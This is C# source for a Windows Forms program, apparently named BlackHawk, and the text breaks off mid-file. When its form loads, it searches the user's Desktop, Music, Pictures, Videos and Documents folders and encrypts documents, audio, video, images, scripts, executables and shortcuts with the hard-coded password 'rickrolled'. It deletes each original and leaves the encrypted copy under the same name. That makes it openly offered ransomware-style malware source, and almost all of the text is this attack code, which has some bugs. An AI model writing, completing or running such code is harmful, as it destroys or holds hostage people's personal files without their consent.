using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpAESCrypt;
using System.IO;
using System.Media;
using Microsoft.Win32;

namespace BlackHawk
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //FIRST THE PROGRAMM WILL ENCRYPT DOCUMENTS IN DESKTOP

            //txt format

            string[] locationtxt = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*txt", SearchOption.AllDirectories);
            for (int i = 0; i < locationtxt.Length; i++)
            {
                var encryptedfile = locationtxt + "encryptedfile.txt";
                
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationtxt[i], encryptedfile);
                File.Delete(locationtxt[i]);
                File.Move(encryptedfile, locationtxt[i]);
               
            }

            //doc format


            string[] locationdoc = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*doc", SearchOption.AllDirectories);
            for (int i = 0; i < locationdoc.Length; i++)
            {
                var encryptedfile = locationdoc + "encryptedfile.doc";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationdoc[i], encryptedfile);
                File.Delete(locationdoc[i]);
                File.Move(encryptedfile, locationdoc[i]);
              
            }
            //docx format


            string[] locationdocx = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*docx", SearchOption.AllDirectories);
            for (int i = 0; i < locationdocx.Length; i++)
            {
                var encryptedfile = locationdocx + "encryptedfile.docx";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationdocx[i], encryptedfile);
                File.Delete(locationdocx[i]);
                File.Move(encryptedfile, locationdocx[i]);
               
            }
            //pdf format


            string[] locationpdf = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*pdf", SearchOption.AllDirectories);
            for (int i = 0; i < locationpdf.Length; i++)
            {
                var encryptedfile = locationpdf + "encryptedfile.pdf";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationpdf[i], encryptedfile);
                File.Delete(locationpdf[i]);
                File.Move(encryptedfile, locationpdf[i]);
                
            }
            //xls format


            string[] locationxls = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*xls", SearchOption.AllDirectories);
            for (int i = 0; i < locationxls.Length; i++)
            {
                var encryptedfile = locationxls + "encryptedfile.xls";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationxls[i], encryptedfile);
                File.Delete(locationxls[i]);
                File.Move(encryptedfile, locationxls[i]);
              
            }
            //xlsx format


            string[] locationxlsx = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*xlsx", SearchOption.AllDirectories);
            for (int i = 0; i < locationxlsx.Length; i++)
            {
                var encryptedfile = locationxlsx + "encryptedfile.xlsx";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationxlsx[i], encryptedfile);
                File.Delete(locationxlsx[i]);
                File.Move(encryptedfile, locationxlsx[i]);
                
            }
            //odt format


            string[] locationodt = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*odt", SearchOption.AllDirectories);
            for (int i = 0; i < locationodt.Length; i++)
            {
                var encryptedfile = locationodt + "encryptedfile.odt";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationodt[i], encryptedfile);
                File.Delete(locationodt[i]);
                File.Move(encryptedfile, locationodt[i]);
        
            }
            //ppt format


            string[] locationppt = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*ppt", SearchOption.AllDirectories);
            for (int i = 0; i < locationppt.Length; i++)
            {
                var encryptedfile = locationppt + "encryptedfile.ppt";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationppt[i], encryptedfile);
                File.Delete(locationppt[i]);
                File.Move(encryptedfile, locationppt[i]);
                
            }
            //pptx format


            string[] locationpptx = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*pptx", SearchOption.AllDirectories);
            for (int i = 0; i < locationpptx.Length; i++)
            {
                var encryptedfile = locationpptx + "encryptedfile.pptx";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationpptx[i], encryptedfile);
                File.Delete(locationpptx[i]);
                File.Move(encryptedfile, locationpptx[i]);
               
            }
            //html format


            string[] locationhtml = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*html", SearchOption.AllDirectories);
            for (int i = 0; i < locationhtml.Length; i++)
            {
                var encryptedfile = locationhtml + "encryptedfile.html";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationhtml[i], encryptedfile);
                File.Delete(locationhtml[i]);
                File.Move(encryptedfile, locationhtml[i]);
               
            }
            //htm format


            string[] locationhtm = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*htm", SearchOption.AllDirectories);
            for (int i = 0; i < locationhtm.Length; i++)
            {
                var encryptedfile = locationhtm + "encryptedfile.htm";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationhtm[i], encryptedfile);
                File.Delete(locationhtm[i]);
                File.Move(encryptedfile, locationhtm[i]);
                
            }

            //ENCRYPT ALL MUSIC FILES IN DESKTOP

            //m4a type


            string[] locationm4a = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*m4a", SearchOption.AllDirectories);
            for (int i = 0; i < locationm4a.Length; i++)
            {
                var encryptedfile = locationm4a + "encryptedfile.m4a";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationm4a[i], encryptedfile);
                File.Delete(locationm4a[i]);
                File.Move(encryptedfile, locationm4a[i]);
         
            }
            //wav type


            string[] locationwav = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*wav", SearchOption.AllDirectories);
            for (int i = 0; i < locationwav.Length; i++)
            {
                var encryptedfile = locationwav + "encryptedfile.wav";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationwav[i], encryptedfile);
                File.Delete(locationwav[i]);
                File.Move(encryptedfile, locationwav[i]);
                
            }
            //mp3 type


            string[] locationmp3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*mp3", SearchOption.AllDirectories);
            for (int i = 0; i < locationmp3.Length; i++)
            {
                var encryptedfile = locationmp3 + "encryptedfile.mp3";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmp3[i], encryptedfile);
                File.Delete(locationmp3[i]);
                File.Move(encryptedfile, locationmp3[i]);
              
            }
            //flac type


            string[] locationflac = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*flac", SearchOption.AllDirectories);
            for (int i = 0; i < locationflac.Length; i++)
            {
                var encryptedfile = locationflac + "encryptedfile.flac";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationflac[i], encryptedfile);
                File.Delete(locationflac[i]);
                File.Move(encryptedfile, locationflac[i]);
               
            }
            //wma type


            string[] locationwma = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*wma", SearchOption.AllDirectories);
            for (int i = 0; i < locationwma.Length; i++)
            {
                var encryptedfile = locationwma + "encryptedfile.wma";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationwma[i], encryptedfile);
                File.Delete(locationwma[i]);
                File.Move(encryptedfile, locationwma[i]);
               
            }
            //aac type


            string[] locationaac = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*aac", SearchOption.AllDirectories);
            for (int i = 0; i < locationaac.Length; i++)
            {
                var encryptedfile = locationaac + "encryptedfile.aac";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationaac[i], encryptedfile);
                File.Delete(locationaac[i]);
                File.Move(encryptedfile, locationaac[i]);
                
            }

            //midi type


            string[] locationmidi = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*midi", SearchOption.AllDirectories);
            for (int i = 0; i < locationmidi.Length; i++)
            {
                var encryptedfile = locationmidi + "encryptedfile.midi";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmidi[i], encryptedfile);
                File.Delete(locationmidi[i]);
                File.Move(encryptedfile, locationmidi[i]);
               
            }

            //flp extenstion


            string[] locationflp = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*flp", SearchOption.AllDirectories);
            for (int i = 0; i < locationflp.Length; i++)
            {
                var encryptedfile = locationflp + "encryptedfile.flp";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationflp[i], encryptedfile);
                File.Delete(locationflp[i]);
                File.Move(encryptedfile, locationflp[i]);
            
            }


            //encrypt music in my music

            //m4a type


            string[] locationmymusicm4a = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*m4a", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicm4a.Length; i++)
            {
                var encryptedfile = locationmymusicm4a + "encryptedfile.m4a";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicm4a[i], encryptedfile);
                File.Delete(locationmymusicm4a[i]);
                File.Move(encryptedfile, locationmymusicm4a[i]);
               
            }
            //wav type


            string[] locationmymusicwav = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*wav", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicwav.Length; i++)
            {
                var encryptedfile = locationmymusicwav + "encryptedfile.wav";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicwav[i], encryptedfile);
                File.Delete(locationmymusicwav[i]);
                File.Move(encryptedfile, locationmymusicwav[i]);
             
            }
            //mp3 type


            string[] locationmymusicmp3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*mp3", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicmp3.Length; i++)
            {
                var encryptedfile = locationmymusicmp3 + "encryptedfile.mp3";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicmp3[i], encryptedfile);
                File.Delete(locationmymusicmp3[i]);
                File.Move(encryptedfile, locationmymusicmp3[i]);
                
            }
            //flac type


            string[] locationmymusicflac = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*flac", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicflac.Length; i++)
            {
                var encryptedfile = locationmymusicflac + "encryptedfile.flac";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicflac[i], encryptedfile);
                File.Delete(locationmymusicflac[i]);
                File.Move(encryptedfile, locationmymusicflac[i]);
            
            }
            //wma type


            string[] locationmymusicwma = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*wma", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicwma.Length; i++)
            {
                var encryptedfile = locationmymusicwma + "encryptedfile.wma";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicwma[i], encryptedfile);
                File.Delete(locationmymusicwma[i]);
                File.Move(encryptedfile, locationmymusicwma[i]);
               
            }
            //aac type


            string[] locationmymusicaac = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*aac", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicaac.Length; i++)
            {
                var encryptedfile = locationmymusicaac + "encryptedfile.aac";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicaac[i], encryptedfile);
                File.Delete(locationmymusicaac[i]);
                File.Move(encryptedfile, locationmymusicaac[i]);
         
            }

            //midi type


            string[] locationmymusicmidi = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*midi", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicmidi.Length; i++)
            {
                var encryptedfile = locationmymusicmidi + "encryptedfile.midi";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicmidi[i], encryptedfile);
                File.Delete(locationmymusicmidi[i]);
                File.Move(encryptedfile, locationmymusicmidi[i]);
          
            }

            //flp extenstion


            string[] locationmymusicflp = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\", "*flp", SearchOption.AllDirectories);
            for (int i = 0; i < locationmymusicflp.Length; i++)
            {
                var encryptedfile = locationmymusicflp + "encryptedfile.flp";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmymusicflp[i], encryptedfile);
                File.Delete(locationmymusicflp[i]);
                File.Move(encryptedfile, locationmymusicflp[i]);
             
            }
            //ENCRYPT VIDEOS IN DESKTOP

            //mp4 type


            string[] locationmp4 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*mp4", SearchOption.AllDirectories);
            for (int i = 0; i < locationmp4.Length; i++)
            {
                var encryptedfile = locationmp4 + "encryptedfile.mp4";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmp4[i], encryptedfile);
                File.Delete(locationmp4[i]);
                File.Move(encryptedfile, locationmp4[i]);
        
            }

            //wmv type


            string[] locationwmv = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*wmv", SearchOption.AllDirectories);
            for (int i = 0; i < locationwmv.Length; i++)
            {
                var encryptedfile = locationwmv + "encryptedfile.wmv";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationwmv[i], encryptedfile);
                File.Delete(locationwmv[i]);
                File.Move(encryptedfile, locationwmv[i]);
              
            }

            //mov type


            string[] locationmov = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*mov", SearchOption.AllDirectories);
            for (int i = 0; i < locationmov.Length; i++)
            {
                var encryptedfile = locationmov + "encryptedfile.mov";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmov[i], encryptedfile);
                File.Delete(locationmov[i]);
                File.Move(encryptedfile, locationmov[i]);
               
            }

            //avi type


            string[] locationavi = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*avi", SearchOption.AllDirectories);
            for (int i = 0; i < locationavi.Length; i++)
            {
                var encryptedfile = locationavi + "encryptedfile.avi";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationavi[i], encryptedfile);
                File.Delete(locationavi[i]);
                File.Move(encryptedfile, locationavi[i]);
              
            }

            //mkv type


            string[] locationmkv = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*mkv", SearchOption.AllDirectories);
            for (int i = 0; i < locationmkv.Length; i++)
            {
                var encryptedfile = locationmkv + "encryptedfile.mkv";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationmkv[i], encryptedfile);
                File.Delete(locationmkv[i]);
                File.Move(encryptedfile, locationmkv[i]);
             
            }

            //ENCRYPT PHOTOS IN DESKTOP

            //jpg type


            string[] locationjpg = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*jpg", SearchOption.AllDirectories);
            for (int i = 0; i < locationjpg.Length; i++)
            {
                var encryptedfile = locationjpg + "encryptedfile.jpg";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationjpg[i], encryptedfile);
                File.Delete(locationjpg[i]);
                File.Move(encryptedfile, locationjpg[i]);
               
            }
            //jpeg type


            string[] locationjpeg = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*jpeg", SearchOption.AllDirectories);
            for (int i = 0; i < locationjpeg.Length; i++)
            {
                var encryptedfile = locationjpeg + "encryptedfile.jpeg";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationjpeg[i], encryptedfile);
                File.Delete(locationjpeg[i]);
                File.Move(encryptedfile, locationjpeg[i]);
           
            }
            //png type


            string[] locationpng = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*png", SearchOption.AllDirectories);
            for (int i = 0; i < locationpng.Length; i++)
            {
                var encryptedfile = locationpng + "encryptedfile.png";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationpng[i], encryptedfile);
                File.Delete(locationpng[i]);
                File.Move(encryptedfile, locationpng[i]);
              
            }
            //gif type


            string[] locationgif = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*gif", SearchOption.AllDirectories);
            for (int i = 0; i < locationgif.Length; i++)
            {
                var encryptedfile = locationgif + "encryptedfile.gif";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationgif[i], encryptedfile);
                File.Delete(locationgif[i]);
                File.Move(encryptedfile, locationgif[i]);
                
            }
            //webP type


            string[] locationwebP = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*webP", SearchOption.AllDirectories);
            for (int i = 0; i < locationwebP.Length; i++)
            {
                var encryptedfile = locationwebP + "encryptedfile.webP";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationwebP[i], encryptedfile);
                File.Delete(locationwebP[i]);
                File.Move(encryptedfile, locationwebP[i]);
                
            }

            //Programming file in desktop

            //python


            string[] locationpy = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*py", SearchOption.AllDirectories);
            for (int i = 0; i < locationpy.Length; i++)
            {
                var encryptedfile = locationpy + "encryptedfile.py";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationpy[i], encryptedfile);
                File.Delete(locationpy[i]);
                File.Move(encryptedfile, locationpy[i]);
               
            }

            //exe file in desktop


            string[] locationexe = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*exe", SearchOption.AllDirectories);
            for (int i = 0; i < locationexe.Length; i++)
            {
                var encryptedfile = locationexe + "encryptedfile.exe";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationexe[i], encryptedfile);
                File.Delete(locationexe[i]);
                File.Move(encryptedfile, locationexe[i]);
               
            }

            //shortcut file in desktop


            string[] locationshort = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*lnk", SearchOption.AllDirectories);
            for (int i = 0; i < locationshort.Length; i++)
            {
                var encryptedfile = locationshort + "encryptedfile.lnk";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", locationshort[i], encryptedfile);
                File.Delete(locationshort[i]);
                File.Move(encryptedfile, locationshort[i]);
             
            }

            //ENCRYPTING FILES IN MY PHOTOS

            //jpg type


            string[] location1jpg = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\", "*jpg", SearchOption.AllDirectories);
            for (int i = 0; i < location1jpg.Length; i++)
            {
                var encryptedfile = location1jpg + "encryptedfile.jpg";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1jpg[i], encryptedfile);
                File.Delete(location1jpg[i]);
                File.Move(encryptedfile, location1jpg[i]);
               
            }
            //jpeg type


            string[] location1jpeg = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\", "*jpeg", SearchOption.AllDirectories);
            for (int i = 0; i < location1jpeg.Length; i++)
            {
                var encryptedfile = location1jpeg + "encryptedfile.jpeg";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1jpeg[i], encryptedfile);
                File.Delete(location1jpeg[i]);
                File.Move(encryptedfile, location1jpeg[i]);
               
            }
            //png type


            string[] location1png = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\", "*png", SearchOption.AllDirectories);
            for (int i = 0; i < location1png.Length; i++)
            {
                var encryptedfile = location1png + "encryptedfile.png";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1png[i], encryptedfile);
                File.Delete(location1png[i]);
                File.Move(encryptedfile, location1png[i]);
              
            }
            //gif type


            string[] location1gif = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\", "*gif", SearchOption.AllDirectories);
            for (int i = 0; i < location1gif.Length; i++)
            {
                var encryptedfile = location1gif + "encryptedfile.gif";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1gif[i], encryptedfile);
                File.Delete(location1gif[i]);
                File.Move(encryptedfile, location1gif[i]);
               
            }
            //webP type


            string[] location1webP = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\", "*webP", SearchOption.AllDirectories);
            for (int i = 0; i < location1webP.Length; i++)
            {
                var encryptedfile = location1webP + "encryptedfile.webP";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1webP[i], encryptedfile);
                File.Delete(location1webP[i]);
                File.Move(encryptedfile, location1webP[i]);
               
            }

            //ENCRYPTING VIDEOS IN MY VIDEOS


            //mp4 type


            string[] location1mp4 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\", "*mp4", SearchOption.AllDirectories);
            for (int i = 0; i < location1mp4.Length; i++)
            {
                var encryptedfile = location1mp4 + "encryptedfile.mp4";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1mp4[i], encryptedfile);
                File.Delete(location1mp4[i]);
                File.Move(encryptedfile, location1mp4[i]);
             
            }

            //wmv type


            string[] location1wmv = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\", "*wmv", SearchOption.AllDirectories);
            for (int i = 0; i < location1wmv.Length; i++)
            {
                var encryptedfile = location1wmv + "encryptedfile.wmv";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1wmv[i], encryptedfile);
                File.Delete(location1wmv[i]);
                File.Move(encryptedfile, location1wmv[i]);
              
            }

            //mov type


            string[] location1mov = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\", "*mov", SearchOption.AllDirectories);
            for (int i = 0; i < location1mov.Length; i++)
            {
                var encryptedfile = location1mov + "encryptedfile.mov";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1mov[i], encryptedfile);
                File.Delete(location1mov[i]);
                File.Move(encryptedfile, location1mov[i]);
               
            }

            //avi type


            string[] location1avi = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\", "*avi", SearchOption.AllDirectories);
            for (int i = 0; i < location1avi.Length; i++)
            {
                var encryptedfile = location1avi + "encryptedfile.avi";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1avi[i], encryptedfile);
                File.Delete(location1avi[i]);
                File.Move(encryptedfile, location1avi[i]);
               
            }

            //mkv type


            string[] location1mkv = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\", "*mkv", SearchOption.AllDirectories);
            for (int i = 0; i < location1mkv.Length; i++)
            {
                var encryptedfile = location1mkv + "encryptedfile.mkv";

                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", location1mkv[i], encryptedfile);
                File.Delete(location1mkv[i]);
                File.Move(encryptedfile, location1mkv[i]);
                
            }

            //ENCRYPTING FILES IN MY DOCUMENTS BUT HERE WE WILL HAVE A NEW METHOD BECAUSE OF PRIVILAGES

            //COLLECTING FILE INFORMATION

            //doc

            string docloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> doclist = new List<string>();
            DirectoryInfo docdinfo = new DirectoryInfo(docloc);



            //docx

            string docxloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> docxlist = new List<string>();
            DirectoryInfo docxdinfo = new DirectoryInfo(docxloc);

            //pdf

            string pdfloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> pdflist = new List<string>();
            DirectoryInfo pdfdinfo = new DirectoryInfo(pdfloc);

            //ppt

            string pptloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> pptlist = new List<string>();
            DirectoryInfo pptdinfo = new DirectoryInfo(pptloc);

            //pptx

            string pptxloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> pptxlist = new List<string>();
            DirectoryInfo pptxdinfo = new DirectoryInfo(pptxloc);


            //xls

            string xlsloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> xlslist = new List<string>();
            DirectoryInfo xlsdinfo = new DirectoryInfo(xlsloc);

            //xlsx

            string xlsxloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> xlsxlist = new List<string>();
            DirectoryInfo xlsxdinfo = new DirectoryInfo(xlsxloc);

            //htm

            string htmloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> htmlist = new List<string>();
            DirectoryInfo htmdinfo = new DirectoryInfo(htmloc);

            //html

            string htmlloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> htmllist = new List<string>();
            DirectoryInfo htmldinfo = new DirectoryInfo(htmlloc);


            //txt

            string txtloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> txtlist = new List<string>();
            DirectoryInfo txtdinfo = new DirectoryInfo(txtloc);


            //odt

            string odtloc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            List<string> odtlist = new List<string>();
            DirectoryInfo odtdinfo = new DirectoryInfo(odtloc);


            //RECURSION

            //recursion

            //doc

            foreach (var docdata in docdinfo.GetFiles("*.doc"))
            {
                doclist.Add(docdata.FullName);
            }

            //docx

            foreach (var docxdata in docxdinfo.GetFiles("*.docx"))
            {
                docxlist.Add(docxdata.FullName);
            }

            //txt

            foreach (var txtdata in txtdinfo.GetFiles("*.txt"))
            {
                txtlist.Add(txtdata.FullName);
            }

            //ppt

            foreach (var pptdata in pptdinfo.GetFiles("*.ppt"))
            {
                pptlist.Add(pptdata.FullName);
            }
            //pptx

            foreach (var pptxdata in pptxdinfo.GetFiles("*.pptx"))
            {
                pptxlist.Add(pptxdata.FullName);
            }
            //odt

            foreach (var odtdata in odtdinfo.GetFiles("*.odt"))
            {
                odtlist.Add(odtdata.FullName);
            }
            //htm

            foreach (var htmdata in htmdinfo.GetFiles("*.htm"))
            {
                htmlist.Add(htmdata.FullName);
            }
            //html

            foreach (var htmldata in htmldinfo.GetFiles("*.html"))
            {
                htmllist.Add(htmldata.FullName);
            }
            //pdf

            foreach (var pdfdata in pdfdinfo.GetFiles("*.pdf"))
            {
                pdflist.Add(pdfdata.FullName);
            }
            //xls

            foreach (var xlsdata in xlsdinfo.GetFiles("*.xls"))
            {
                xlslist.Add(xlsdata.FullName);
            }
            //xlsx

            foreach (var xlsxdata in xlsxdinfo.GetFiles("*.xlsx"))
            {
                xlsxlist.Add(xlsxdata.FullName);
            }


            //START ENCRYPTING

            //doc

            foreach (string docdata in doclist)
            {
                string encryptedfile = docloc + "encryptedfile.doc";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", docdata, encryptedfile);
                File.Delete(docdata);
                File.Move(encryptedfile, docdata);
                

            }

            //docx

            foreach (string docxdata in docxlist)
            {
                string encryptedfile = docxloc + "encryptedfile.docx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", docxdata, encryptedfile);
                File.Delete(docxdata);
                File.Move(encryptedfile, docxdata);
             

            }

            //pdf

            foreach (string pdfdata in pdflist)
            {
                string encryptedfile = pdfloc + "encryptedfile.pdf";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pdfdata, encryptedfile);
                File.Delete(pdfdata);
                File.Move(encryptedfile, pdfdata);
                

            }

            //ppt

            foreach (string pptdata in pptlist)
            {
                string encryptedfile = pptloc + "encryptedfile.ppt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pptdata, encryptedfile);
                File.Delete(pptdata);
                File.Move(encryptedfile, pptdata);
                

            }
            //pptx

            foreach (string pptxdata in pptxlist)
            {
                string encryptedfile = pptxloc + "encryptedfile.pptx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", pptxdata, encryptedfile);
                File.Delete(pptxdata);
                File.Move(encryptedfile, pptxdata);
               

            }
            //xls

            foreach (string xlsxdata in xlsxlist)
            {
                string encryptedfile = xlsxloc + "encryptedfile.xlsx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", xlsxdata, encryptedfile);
                File.Delete(xlsxdata);
                File.Move(encryptedfile, xlsxdata);
            

            }
            //xlsx

            foreach (string xlsxdata in xlsxlist)
            {
                string encryptedfile = xlsxloc + "encryptedfile.xlsx";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", xlsxdata, encryptedfile);
                File.Delete(xlsxdata);
                File.Move(encryptedfile, xlsxdata);
               

            }
            //htm

            foreach (string htmdata in htmlist)
            {
                string encryptedfile = htmloc + "encryptedfile.htm";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", htmdata, encryptedfile);
                File.Delete(htmdata);
                File.Move(encryptedfile, htmdata);
               

            }
            //html

            foreach (string htmldata in htmllist)
            {
                string encryptedfile = htmlloc + "encryptedfile.html";
                SharpAESCrypt.SharpAESCrypt.Encrypt("rickrolled", htmldata, encryptedfile);
                File.Delete(htmldata);
                File.Move(encryptedfile, htmldata);
             

            }
            //odt

